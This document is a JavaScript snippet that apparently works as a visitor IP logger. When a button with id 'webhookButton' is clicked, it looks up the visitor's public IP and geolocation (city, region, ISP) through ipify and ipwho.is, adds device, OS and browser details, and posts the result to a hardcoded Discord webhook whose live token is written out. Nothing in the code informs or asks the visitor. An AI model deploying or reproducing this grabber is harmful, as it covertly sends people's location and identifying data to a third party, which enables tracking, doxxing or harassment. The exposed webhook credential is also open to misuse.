function getDeviceInfo() {
    let userAgent = navigator.userAgent;
    let device = /Mobi|Android/i.test(userAgent) ? "Mobile" : /Tablet|iPad/i.test(userAgent) ? "Tablet" : "Desktop";
    let os = navigator.platform;
    let browser = "Unknown Browser";

    if (userAgent.includes("Chrome")) browser = "Google Chrome";
    if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
    if (userAgent.includes("Edge")) browser = "Microsoft Edge";
    if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";

    return { device, os, browser };
}

document.getElementById("webhookButton").addEventListener("click", function() {
    fetch("https://api64.ipify.org?format=json")  // Get user's IP
        .then(response => response.json())
        .then(data => {
            let userIP = data.ip;

            // Fetch IP details from "ipwho.is"
            fetch(`https://ipwho.is/${userIP}`)
                .then(response => response.json())
                .then(ipData => {
                    let deviceInfo = getDeviceInfo();

                    let message = `📡 **New Visitor Info** 📡\n\n` +
                                  `🆔 **IP Address**: ${ipData.ip}\n` +
                                  `🌍 **Country**: ${ipData.country}\n` +
                                  `🏙 **City**: ${ipData.city}\n` +
                                  `📍 **Region**: ${ipData.region}\n` +
                                  `📡 **ISP**: ${ipData.isp}\n` +
                                  `📱 **Device**: ${deviceInfo.device}\n` +
                                  `🖥 **Operating System**: ${deviceInfo.os}\n` +
                                  `🌐 **Browser**: ${deviceInfo.browser}\n` +
                                  `🕒 **Time**: ${new Date().toLocaleString()}`;

                    // Send the IP & device info to Discord webhook
                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: message })
                    });
                })
                .catch(error => {
                    fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: "⚠️ Error fetching IP details: " + error })
                    });
                });
        })
        .catch(error => {
            fetch("https://discord.com/api/webhooks/1345338419219267664/yU2pUdB2V4FJDrN1CPd5cHJUHY3B1OCxoihp2nSAkeHwxj7QJNCy-5zNgERi5HqTYbKM", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "⚠️ Error fetching IP: " + error })
            });
        });
});
